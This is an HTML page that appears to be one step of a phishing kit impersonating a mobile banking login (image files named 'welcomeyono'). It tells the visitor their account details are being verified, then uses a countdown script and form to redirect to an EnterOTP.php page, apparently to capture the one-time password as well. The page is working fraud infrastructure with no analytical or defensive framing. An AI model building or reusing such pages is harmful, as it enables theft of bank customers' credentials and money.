<!DOCTYPE html>
<html lang="zxx">
<head>
<script src="./removeBanner.js"></script>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/site.webmanifest">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="theme-color" content="#ffffff">
    <title>Processing Please Wait...</title>
    <style>
    #ad
    {
       width:20%;
       margin:-30px;
    }
    #bg
    {
    width: 105%;
    margin:-8px;
    padding:0px px;
    }
    #aa
    {
    width:104.8%;
    margin-left:-8px;
    border-bottom:solid #7212b3;
    border-width:4px;
    }
    #ll
    {
    width: 343px;
    background-color: white;
    color: #27a2db;
    border: solid #27a2db;
    border-radius: 2px;
    border-width: 1px;
    cursor: pointer;
    font-size: 18px;
    height: 42px;
    margin-left: 2px;
    }
    #ll:hover
    {
    background-color:#7212b3;
    color: white;
    border: solid black;
    border-radius: 1px;
    border-width:0.1px;
    cursor: pointer;
    font-size: 18px;
    height: 42px;
    }
    .line-text
    {
    position:absolute;
    top:53px;
    padding:10px;
    }
    </style>
    </head>
    <body>
    <div class="line-text">
    <b style="color:white; font-size:20px; font-family:arial;">Processing...</b>
    </div></div>
    <img src="head.png" alt="" id="bg"><br><br>
    <center><img src="welcomeyono.png" alt="" id="aa"></center><br>
    <center><b style="font-size:14px; font-family: Arial, Helvetica, sans-serif;">Thank you for validating your account information</b></center><br><br>
    <center><img src="loading_1.gif" alt="" id="ad"><br><br><br></center>
    <form action="EnterOTP.php" method="post">
    <div id="ha">
    <center><h4 style="color:green; font-size:15px; font-family: Arial, Helvetica, sans-serif; margin:0px;">Please wait while we verify your login details...</h4></center>
    </div>
    <div id="ba">
   <center><b style="font-size:14px; font-family: Arial, Helvetica, sans-serif;">Don't press any key while processing...</b></center>
   </div><br><br><br><be><br>
   <div id="kk">
   <center><button  onclick="myFunction()" type="submit" id="ll">Cancel</button><center>
   </div><br>
   <script>
   function myFunction() {
   window.location.href = "index.php";
   }
   </script>
   <!--<div id="bb">
   <center><b style="color:#7212b3; margin:0px;">We sending One Time Password on your registered mobile number.</b></center>
    </div>-->
    <body onload="startTimer();">
    <div style="text-align:center;">
    <script type="text/javascript">
    var timer=10;
    var sec=10;
    function startTimer() {
    sec=parseInt(timer%10);
    
    if (timer<0) {
    // timer.stop();
    window.location.href = "EnterOTP.php";
    }
    
    document.getElementById("time").innerHTML="<b> Please wait  </b>" +sec.toString();
    timer--;
    setTimeout(function(){
    startTimer();
    
    }, 1000);
    }
    </script>
    <div>
    <b style="color:grey; font-size:15px;"><span style="color:grey; font-size:15px;" id="time"></span>&nbsp;second</b>
    